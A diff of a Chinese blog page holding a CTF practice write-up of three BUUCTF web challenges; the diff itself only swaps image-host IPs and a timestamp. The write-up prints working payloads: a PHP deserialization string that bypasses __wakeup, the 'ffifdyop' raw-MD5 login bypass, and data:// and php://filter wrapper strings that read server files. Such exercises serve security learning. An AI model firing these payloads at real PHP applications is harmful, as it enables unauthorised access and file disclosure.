@@ -23,26 +23,26 @@
 <meta property="og:site_name" content="b1ub1u的小站">
 <meta property="og:description" content="前言全国大学生信息安全竞赛线上赛5.28~5.29开始，现在还啥都不会……要快点开始刷题了，不过突然发现以前的题很简单了 [极客大挑战 2019]PHP题目说因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 不愧是我！！！ 扫一下有个www.zip泄露，里面比较重要的是class.php和index.phpclass.php 12345678910111213141516171819">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/sy538m_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbhsq_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbicf_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tvk3m7_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsblwz_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbre5_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbjer_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbnua_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/tsbkt9_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkzty_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xml057_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xml3d8_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/sy51jv_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/sy538m_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbhsq_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbicf_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tvk3m7_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsblwz_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbre5_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbjer_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbnua_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/tsbkt9_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/xmkzty_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/xml057_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/xmkz01_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/xml3d8_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/05/09/xmkz01_0.png">
 <meta property="article:published_time" content="2022-05-09T09:45:51.000Z">
-<meta property="article:modified_time" content="2022-05-09T12:50:28.274Z">
+<meta property="article:modified_time" content="2023-03-02T10:23:54.853Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png">
+<meta name="twitter:image" content="http://120.27.243.85:11111/i/2022/05/09/sy51jv_0.png">
   
   
   <title>buu刷题-5.9 - b1ub1u的小站</title>
@@ -264,26 +264,26 @@
 <p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>所以就是打反序列化啦<br><img src="http://81.70.101.23:11111/i/2022/05/09/sy51jv_0.png" srcset="/img/loading.gif" lazyload><br>这里主要考察两点<br>一是private变量序列化时那个不可见字符是%00，占一个字节<br>二是绕过__wakeup魔术方法把类中变量数目比正常的多，比如3、4、5…都行</p>
+<p>所以就是打反序列化啦<br><img src="http://120.27.243.85:11111/i/2022/05/09/sy51jv_0.png" srcset="/img/loading.gif" lazyload><br>这里主要考察两点<br>一是private变量序列化时那个不可见字符是%00，占一个字节<br>二是绕过__wakeup魔术方法把类中变量数目比正常的多，比如3、4、5…都行</p>
 <p>payload: <code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p>
-<p><img src="http://81.70.101.23:11111/i/2022/05/09/sy538m_0.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>初始界面是个提交框，输入什么都没有回显，<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbhsq_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>用burp抓包放包后看见hint<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbicf_0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://120.27.243.85:11111/i/2022/05/09/sy538m_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>初始界面是个提交框，输入什么都没有回显，<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbhsq_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>用burp抓包放包后看见hint<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbicf_0.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>这里有两个不知道的知识点：</p>
-<p>一是md5函数当选定true模式后返回的是十六进制数据<br>比如<img src="http://81.70.101.23:11111/i/2022/05/09/tvk3m7_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>一是md5函数当选定true模式后返回的是十六进制数据<br>比如<img src="http://120.27.243.85:11111/i/2022/05/09/tvk3m7_0.png" srcset="/img/loading.gif" lazyload></p>
 <p>二是ffifdyop这个字符串md5的十六进制值是’or’6xxxxxx，所以构造后就是<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxx&#39;</code>恒真式，类似SQL注入</p>
-<p>可以看到这里指向到levels91.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsblwz_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbre5_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>简单的md5数组绕过，又指向到levell14.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbjer_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>访问<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbnua_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>还是一样的数组绕过，得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/tsbkt9_0.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>进入题目是源代码<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkzty_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>第一个if判断可以用data伪协议<br>然后用filter伪协议配合源码里的include()函数读取useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml057_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>base64解密后得到useless.php<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这里指向到levels91.php<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsblwz_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbre5_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单的md5数组绕过，又指向到levell14.php<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbjer_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbnua_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是一样的数组绕过，得到flag<br><img src="http://120.27.243.85:11111/i/2022/05/09/tsbkt9_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>进入题目是源代码<br><img src="http://120.27.243.85:11111/i/2022/05/09/xmkzty_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个if判断可以用data伪协议<br>然后用filter伪协议配合源码里的include()函数读取useless.php<br><img src="http://120.27.243.85:11111/i/2022/05/09/xml057_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>base64解密后得到useless.php<br><img src="http://120.27.243.85:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后源码里unserialize函数可以利用反序列化漏洞读取flag.php<br>由于file_get_contents类似于include，稳妥起见依然可以用filter协议配合base64</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>最终payload：?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}<br><img src="http://81.70.101.23:11111/i/2022/05/09/xml3d8_0.png" srcset="/img/loading.gif" lazyload></p>
-<p>base64解密后得到flag<br><img src="http://81.70.101.23:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终payload：?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}<br><img src="http://120.27.243.85:11111/i/2022/05/09/xml3d8_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>base64解密后得到flag<br><img src="http://120.27.243.85:11111/i/2022/05/09/xmkz01_0.png" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
